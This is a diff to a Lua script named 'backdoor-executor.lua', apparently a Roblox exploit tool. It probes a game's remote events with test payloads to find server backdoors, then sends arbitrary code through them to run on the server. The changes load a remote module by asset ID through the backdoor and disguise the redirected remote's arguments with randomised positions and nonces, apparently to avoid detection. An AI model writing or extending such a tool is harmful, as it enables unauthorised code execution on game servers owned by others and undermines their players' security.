@@ -1,10 +1,12 @@
 -- services
 local httpService = game:GetService("HttpService")
+local insertService = game:GetService("InsertService")
 local jointsService = game:GetService("JointsService")
 local starterGui = game:GetService("StarterGui")
 -- variables
 local config
 local execGuiAPI
+local remoteRedirectionSucceed = false
 local debugSource = [[
 local stdout = table.create(512)
 local execSucc, result do
@@ -54,7 +56,7 @@ local msgOutputs = {
 	["configCantLoad"] = "Local configuration cannot be loaded, overwriting.",
 	["attached"] = "\n Attached Remote: %s\n Type: %s",
 	["scanBenchmark"] = "Took %.2f second(s) to scan remotes.",
-	["failedRemoteRedirection"] = "Remote redirection took too long to load, using original remote.",
+	["failedRemoteRedirection"] = "Remote redirection failed to load, using original remote.",
 	["printRemote"] = "\n Remote: %s\n Type: %s",
 	["mainTabText"] = "--[[\n\tbackdoor-executor.lua loaded!\n\tUsing 'github.com/jLn0n/executor-gui' for interface.\n--]]\n",
 }
@@ -112,6 +114,19 @@ local function generateRandString(lenght)
 		result ..= string.sub(stringList, randInteger, randInteger)
 	end
 	return result
+end
+
+local function notSameRandNumber(min, max, ...)
+	local numIndexes = {...}
+	local randNumber = math.random(min, max)
+
+	task.defer(table.clear, numIndexes) -- optimization!?!!?
+	return (
+		if not table.find(numIndexes, randNumber) then
+			randNumber
+		else
+			notSameRandNumber(min, max, ...)
+	)
 end
 
 local function isRemoteAllowed(object)
@@ -182,22 +197,44 @@ local function getRemoteFunc(object)
 	)
 end
 
+local function applyRedirectedRemoteSecurity(source)
+	if not config.redirectRemote then return end
+	local generatedArgs = table.create(10)
+	local srcArgIndex = math.random(2, 9)
+	local randIndex = notSameRandNumber(1, 8, srcArgIndex)
+	local nonceIndex = notSameRandNumber(1, 8, srcArgIndex, randIndex)
+
+	table.insert(generatedArgs, 10, true)
+	generatedArgs[srcArgIndex] = source
+	generatedArgs[randIndex] = srcArgIndex
+	generatedArgs[nonceIndex] = "~@" .. generateRandString(randIndex + 10)
+	for argIndex = 1, 9 do
+		if typeof(generatedArgs[argIndex]) ~= "nil" then continue end
+		local useString = math.random(1, 2) == 2
+
+		generatedArgs[argIndex] = (if useString then generateRandString(math.random(12, 24)) else math.random(1, 255))
+	end
+
+	return generatedArgs
+end
+
 local function execScript(source, _sourceName, noRedirectOutput)
 	if not remoteInfo.foundBackdoor then return end
 	source = applyMacros(source)
+	source = (if remoteInfo.srcFunc then remoteInfo.srcFunc(source) else source)
 	local remoteFunc = getRemoteFunc(remoteInfo.instance)
 
 	if (config.redirectOutput and not noRedirectOutput) then
-		local nonce = generateRandString(25)
+		local nonce = generateRandString(32)
 		source = string.format(debugSource, source, nonce)
 
 		local connection
 		connection = jointsService.ChildAdded:Connect(function(object)
 			if object.Name == nonce then connection:Disconnect()
 				local rawStdout = object:GetAttribute("stdout")
-				local jsonConvertSucc, stdout = pcall(httpService.JSONDecode, httpService, rawStdout)
+				local jsonConverted, stdout = pcall(httpService.JSONDecode, httpService, rawStdout)
 
-				if jsonConvertSucc and typeof(stdout) == "table" then
+				if jsonConverted and typeof(stdout) == "table" then
 					for _, output in stdout do
 						local outputType, timestamp = output[1], output[2]
 						output = table.concat(output, " ", 3)
@@ -222,7 +259,11 @@ local function execScript(source, _sourceName, noRedirectOutput)
 		task.delay(60, connection.Disconnect, connection)
 	end
 
-	remoteInfo.args[remoteInfo.argSrcIndex] = (if remoteInfo.srcFunc then remoteInfo.srcFunc(source) else source)
+	if (config.redirectRemote and remoteRedirectionSucceed) then
+		remoteInfo.args = applyRedirectedRemoteSecurity(source)
+	else
+		remoteInfo.args[remoteInfo.argSrcIndex] = source
+	end
 	task.spawn(remoteFunc, remoteInfo.instance, unpack(remoteInfo.args))
 end
 
@@ -245,16 +286,39 @@ local function onAttached(remoteObj, params)
 	})
 
 	if config.redirectRemote then
-		local redirectedRemote = jointsService:FindFirstChildWhichIsA("RemoteEvent")
-		if not redirectedRemote or not redirectedRemote:GetAttribute("bexeremote") then
+		local redirectionHandler = insertService:FindFirstChildWhichIsA("StringValue")
+
+		if not (redirectionHandler and redirectionHandler:GetAttribute("bexehandler")) then
 			execScript("require(11906423264)(%userid%)", nil, true)
-			redirectedRemote = jointsService:WaitForChild("bexe-remote", 5)
+			redirectionHandler = insertService:WaitForChild("bexe-handler", 5)
 		end
 
-		if redirectedRemote then
-			remoteInfo.instance = redirectedRemote
-			remoteInfo.argSrcIndex = 1
-			remoteInfo.args = {"source"}
+		if redirectionHandler then
+			local redirectedEvent = pathToInstance(redirectionHandler.Value)
+
+			if redirectedEvent and
+				redirectedEvent:IsA("RemoteEvent") and
+				redirectedEvent:GetAttribute("bexeremote")
+			then
+				remoteRedirectionSucceed = true
+
+				remoteInfo.instance = redirectedEvent
+				remoteInfo.argSrcIndex = 1
+				remoteInfo.args = {"source"}
+
+				redirectionHandler:GetPropertyChangedSignal("Value"):Connect(function()
+					local newEvent = pathToInstance(redirectionHandler.Value)
+
+					if newEvent and
+						newEvent:IsA("RemoteEvent") and
+						newEvent:GetAttribute("bexeremote")
+					then
+						remoteInfo.instance = newEvent
+					end
+				end)
+			else
+				warn(msgOutputs.failedRemoteRedirection)
+			end
 		else
 			warn(msgOutputs.failedRemoteRedirection)
 		end
@@ -272,7 +336,7 @@ end
 
 local function findBackdoors()
 	if remoteInfo.foundBackdoor then return end
-	local nonce = generateRandString(25)
+	local nonce = generateRandString(32)
 	local connection
 	connection = jointsService.ChildAdded:Connect(function(object)
 		if object:IsA("StringValue") and
@@ -287,7 +351,7 @@ local function findBackdoors()
 		if remoteInfo.foundBackdoor then break end
 		local remoteFunc, objectPath = getRemoteFunc(object), object:GetFullName()
 
-		print(string.format(msgOutputs.printRemote, object:GetFullName(), object.ClassName))
+		print(string.format(msgOutputs.printRemote, objectPath, object.ClassName))
 		pcall(task.spawn, remoteFunc, object, string.format(testSource, nonce, objectPath))
 		table.insert(scannedRemotes, objectPath)
 	end
